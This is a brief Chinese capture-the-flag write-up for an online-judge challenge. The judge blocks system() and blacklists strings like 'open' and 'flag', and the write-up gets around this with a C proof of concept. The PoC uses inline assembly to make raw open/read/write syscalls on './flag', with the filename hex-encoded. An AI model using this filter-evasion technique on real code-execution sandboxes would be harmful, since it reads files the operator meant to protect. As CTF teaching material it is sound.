# Or4ngeOJ&Revenge
## 题目描述
没有附件，打开网页是一个OJ，由于某些因素没有放上一道OJ题目（逃

提示flag位置，同时发现无法执行system，直接orw读取flag即可。

Revenge查看源码发现提示有黑名单，测试发现ban了open,flag等字符串，这里就有很多种做法如文件包含、写汇编ORW等。

## 一个可行的poc
```c
#include <stdio.h>
 
int exp()
{
    asm("sub $100, %rsp");    
    asm("xor %rdi, %rdi");
    asm("xor %rdx, %rdx");
    asm("xor %rax, %rax");
    asm("xor %rsi, %rsi");
    asm("movq $0x67616c662f2e,%rdi");
    asm("pushq %rdi");       
    asm("movq %rsp,%rdi");
    asm("movq $2,%rax");
    asm("syscall");  
    asm("nop");
    asm("pushq $0x60");
    asm("popq %rdx");
    asm("movq %rax, %rdi");
    asm("movq %rsp, %rsi");
    asm("movq $0, %rax");
    asm("syscall");
    asm("nop");
    asm("movq $1, %rdi");
    asm("movq $1, %rax");
    asm("syscall");
    asm("nop");
    asm("movq $60, %rax");  
    asm("movq $0, %rdi");    
    asm("syscall");
}
 
int main()
{
    exp();
    return 0;
}

```
